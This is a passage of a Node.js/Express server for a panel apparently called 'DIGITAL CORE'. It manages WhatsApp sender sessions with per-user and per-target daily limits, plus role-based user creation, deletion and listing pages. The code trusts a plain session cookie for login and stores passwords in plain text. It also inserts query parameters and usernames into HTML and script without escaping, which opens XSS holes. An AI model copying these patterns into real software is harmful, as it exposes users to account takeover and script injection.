    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('')) {
    return res.json({ success: false, error: "Nomor harus valid" });
  }
  
  if (cleanNumber.length < 7) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 1) {
      return res.send(`
        <script>
          alert("❌ Username minimal 1 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 1) {
      return res.send(`
        <script>
          alert("❌ Password minimal 1 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --primary: #00d2ff;
            --secondary: #3a7bd5;
            --accent: #00f2fe;
            --bg-dark: #050505;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            padding: 40px 20px;
            position: relative;
            overflow-y: auto;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 210, 255, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(58, 123, 213, 0.05) 0%, transparent 40%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.5;
        }

        .content {
            position: relative;
            z-index: 2;
            max-width: 550px;
            margin: 0 auto;
        }

        /* Header Mewah */
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 20px;
        }
        
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 15px rgba(0, 210, 255, 0.3));
        }

        .header p {
            color: #888;
            font-size: 14px;
            letter-spacing: 1px;
            font-weight: 300;
        }

        /* Form Container - Glassmorphism Ultra */
        .form-container {
            background: rgba(15, 15, 15, 0.6);
            border: 1px solid var(--glass-border);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        /* User info info */
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.3s;
        }
        
        .user-info:hover {
            border-color: var(--primary);
            background: rgba(0, 210, 255, 0.02);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .info-label {
            color: #777;
            font-weight: 400;
        }

        .info-value {
            color: #fff;
            font-weight: 600;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }

        /* Role Badges */
        .role-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
        .role-reseller { background: linear-gradient(45deg, #00B4DB, #0083B0); color: #fff; box-shadow: 0 0 15px rgba(0, 180, 219, 0.3); }
        .role-user { background: linear-gradient(45deg, #11998e, #38ef7d); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }

        /* Form Controls */
        .form-group { margin-bottom: 25px; }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: #aaa;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        label i { color: var(--primary); margin-right: 8px; }

        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 15px;
            border: 1px solid rgba(255,255,255,0.08);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 14px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            outline: none;
        }

        input:focus, select:focus {
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
            transform: scale(1.02);
        }

        /* Buttons */
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 35px;
        }

        .btn {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-save {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: #fff;
            box-shadow: 0 10px 20px rgba(0, 210, 255, 0.2);
        }

        .btn-save:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 210, 255, 0.4);
            filter: brightness(1.1);
        }

        .btn-back {
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .btn-back:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #fff;
            transform: translateY(-3px);
        }

        /* Info Boxes */
        .permission-info {
            background: rgba(0, 210, 255, 0.05);
            padding: 15px;
            border-radius: 15px;
            font-size: 12px;
            color: #00d2ff;
            text-align: center;
            margin-top: 25px;
            border: 1px solid rgba(0, 210, 255, 0.2);
        }

        .permission-note {
            background: rgba(255, 255, 255, 0.02);
            padding: 15px;
            border-radius: 15px;
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.05);
            line-height: 1.6;
        }

        /* Animations */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-container { 
            animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
        }

        @media (max-width: 500px) {
            body { padding: 20px 15px; }
            .form-container { padding: 30px 20px; }
            .header h2 { font-size: 22px; }
            .button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2><i class="fas fa-user-plus"></i> ADD USER</h2>
            <p>Access Control & User Provisioning</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Active Session:</span>
                    <span class="info-value"><i class="fas fa-circle" style="color:#00ff00; font-size:8px; margin-right:5px;"></i> ${username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Privilege Level:</span>
                    <span class="info-value">
                        <span class="role-badge role-${role}">
                            ${role.charAt(0).toUpperCase() + role.slice(1)}
                        </span>
                    </span>
                </div>
            </div>

            <form method="POST" action="/adduser">
                <div class="form-group">
                    <label for="username"><i class="fas fa-id-badge"></i> Username</label>
                    <input type="text" id="username" name="username" placeholder="Target identity name" required>
                </div>

                <div class="form-group">
                    <label for="password"><i class="fas fa-fingerprint"></i> Password / Key</label>
                    <input type="text" id="password" name="password" placeholder="Secure access key" required>
                </div>

                <div class="form-group">
                    <label for="role"><i class="fas fa-shield-halved"></i> Assign Role</label>
                    <select id="role" name="role" required>
                        ${roleOptions}
                    </select>
                </div>

                <div class="form-group">
                    <label for="durasi"><i class="fas fa-hourglass-half"></i> Duration (Days)</label>
                    <input type="number" id="durasi" name="durasi" min="1" max="365" placeholder="30" value="30" required>
                </div>

                <div class="permission-info">
                    <i class="fas fa-shield-check"></i> 
                    <strong>Access Protocol:</strong> 
                    ${role === 'reseller' ? 'Standard user creation only' : 
                      role === 'admin' ? 'Elevated privileges (Reseller & User)' : 
                      'Full root authority enabled'}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-bolt"></i> EXECUTE CREATE
                    </button>
                    
                    <a href="/dashboard" class="btn btn-back">
                        <i class="fas fa-times"></i> ABORT
                    </a>
                </div>
            </form>
                
            <div class="permission-note">
                <i class="fas fa-info-circle"></i>
                Please review configuration. Created identities are immutable and cannot be purged by the creator.
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a1a1a',
                lineColor: '#1a1a1a',
                minSpeedX: 0.1,
                maxSpeedX: 0.4,
                density: 10000,
                particleRadius: 3,
                curvedLines: true,
                proximity: 110
            });

            document.getElementById('role').addEventListener('change', function() {
                const selectedRole = this.value;
                const badge = document.querySelector('.user-info .role-badge');
                if (badge) {
                    badge.className = \`role-badge role-\${selectedRole}\`;
                    badge.textContent = selectedRole.charAt(0).toUpperCase() + selectedRole.slice(1);
                }
            });
        });
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

  <style>
    :root {
      --primary: #00d2ff;
      --secondary: #3a7bd5;
      --accent: #00f2fe;
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: var(--bg-dark);
      color: #FFFFFF;
      min-height: 100vh;
      padding: 40px 20px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
      background-image: 
          radial-gradient(circle at 50% -20%, rgba(0, 210, 255, 0.15) 0%, transparent 50%),
          radial-gradient(circle at 0% 100%, rgba(58, 123, 213, 0.1) 0%, transparent 40%);
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.4;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1100px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
      padding: 20px;
    }

    .header h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 36px;
      font-weight: 700;
      background: linear-gradient(to right, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: 4px;
      margin-bottom: 12px;
      filter: drop-shadow(0 0 15px rgba(0, 210, 255, 0.3));
    }

    .header p {
      color: rgba(255, 255, 255, 0.5);
      font-size: 14px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    /* Tombol Add User Mewah */
    .btn-add-user {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 14px 28px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: #FFFFFF;
      text-decoration: none;
      border-radius: 15px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 13px;
      letter-spacing: 1px;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      border: none;
      cursor: pointer;
      margin-bottom: 30px;
      box-shadow: 0 10px 20px rgba(0, 210, 255, 0.2);
    }

    .btn-add-user:hover {
      transform: translateY(-5px) scale(1.05);
      box-shadow: 0 15px 30px rgba(0, 210, 255, 0.4);
      filter: brightness(1.1);
    }

    /* Stats Bar High-End */
    .stats-bar {
      display: flex;
      justify-content: space-around;
      margin-bottom: 35px;
      padding: 30px;
      background: rgba(15, 15, 15, 0.6);
      border: 1px solid var(--glass-border);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }

    .stat-item {
      text-align: center;
      position: relative;
      flex: 1;
    }

    .stat-item:not(:last-child)::after {
      content: "";
      position: absolute;
      right: 0;
      top: 20%;
      height: 60%;
      width: 1px;
      background: linear-gradient(transparent, rgba(255,255,255,0.1), transparent);
    }

    .stat-value {
      font-family: 'Rajdhani', sans-serif;
      font-size: 32px;
      font-weight: 700;
      color: var(--primary);
      display: block;
      text-shadow: 0 0 10px rgba(0, 210, 255, 0.5);
    }

    .stat-label {
      font-size: 11px;
      color: rgba(255, 255, 255, 0.4);
      text-transform: uppercase;
      font-weight: 600;
      letter-spacing: 2px;
      margin-top: 5px;
    }

    /* Table Glassmorphism Ultra */
    .table-container {
      overflow-x: auto;
      border-radius: 25px;
      border: 1px solid var(--glass-border);
      background: rgba(10, 10, 10, 0.4);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      margin-bottom: 35px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 800px;
    }

    th {
      background: rgba(255, 255, 255, 0.03);
      padding: 22px 20px;
      text-align: left;
      color: var(--primary);
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    td {
      padding: 20px;
      color: rgba(255, 255, 255, 0.8);
      font-size: 14px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
      font-family: 'Rajdhani', sans-serif;
      font-weight: 500;
      letter-spacing: 0.5px;
    }

    tr:hover td {
      background: rgba(255, 255, 255, 0.02);
      color: #fff;
    }

    /* Role Badges Glow */
    .role-badge {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 8px;
      font-size: 10px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
    .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
    .role-reseller { background: linear-gradient(45deg, #00B4DB, #0083B0); color: #fff; box-shadow: 0 0 15px rgba(0, 180, 219, 0.3); }
    .role-user { background: linear-gradient(45deg, #11998e, #38ef7d); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }

    .btn-edit {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 8px 16px;
      background: rgba(0, 210, 255, 0.1);
      border: 1px solid rgba(0, 210, 255, 0.3);
      border-radius: 10px;
      color: var(--primary);
      text-decoration: none;
      font-size: 12px;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-edit:hover {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 15px var(--primary);
    }

    .close-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: fit-content;
      min-width: 200px;
      padding: 16px 30px;
      margin: 40px auto;
      background: rgba(255, 255, 255, 0.05);
      color: #FFFFFF;
      text-align: center;
      border-radius: 15px;
      text-decoration: none;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      font-weight: 600;
      letter-spacing: 2px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .close-btn:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: #fff;
      transform: translateY(-3px);
    }

    /* Animations */
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .stats-bar, .table-container { 
      animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
    }

    @media (max-width: 768px) {
      .header h2 { font-size: 24px; }
      .stats-bar {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 20px;
      }
      .stat-item:not(:last-child)::after { display: none; }
    }

    .table-container::-webkit-scrollbar {
      height: 6px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: var(--primary);
      border-radius: 10px;
    }
  </style>
</head>

<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-project-diagram"></i> USER CENTRAL</h2>
      <p>Management Console & System Directory</p>
    </div>

    ${messageHtml}

    <div style="text-align: center;">
      ${addUserButton}
    </div>

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Nodes</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Entities</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Distributors</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Supervisors</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-id-card"></i> Identity</th>
            <th><i class="fas fa-shield-halved"></i> Security Tier</th>
            <th><i class="fas fa-hourglass-end"></i> Termination</th>
            <th><i class="fas fa-microchip"></i> Uptime Left</th>
            <th><i class="fas fa-terminal"></i> Command</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-power-off"></i> EXIT DIRECTORY
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#1a1a1a',
        lineColor: '#1a1a1a',
        minSpeedX: 0.1,
        maxSpeedX: 0.4,
        density: 12000,
        particleRadius: 2,
        curvedLines: true,
        proximity: 100
      });
    });
  </script>
</body>

</html>
  `;
  res.send(html);
});

